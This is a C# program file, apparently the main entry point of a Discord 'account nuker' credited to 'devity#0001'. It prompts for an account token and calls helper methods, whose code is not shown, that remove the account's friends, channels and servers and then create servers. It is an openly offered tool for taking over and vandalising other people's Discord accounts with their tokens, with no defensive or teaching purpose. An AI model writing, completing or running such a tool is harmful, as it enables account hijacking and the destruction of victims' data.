using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Discord_Accout_Nukes;

namespace Discord_Accout_Nuke
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.Title = "account nuker by devity#0001";

            Console.WriteLine("[N] Please enter the token ");
            string Token = Console.ReadLine();


            Console.Clear();

            HTTP.RemoveFriends(Token);
            HTTP.RemoveChannels(Token);
            HTTP.RemoveGuilds(Token);
            HTTP.ServerCreate(Token);


            Console.ReadKey();


        }
    }
}
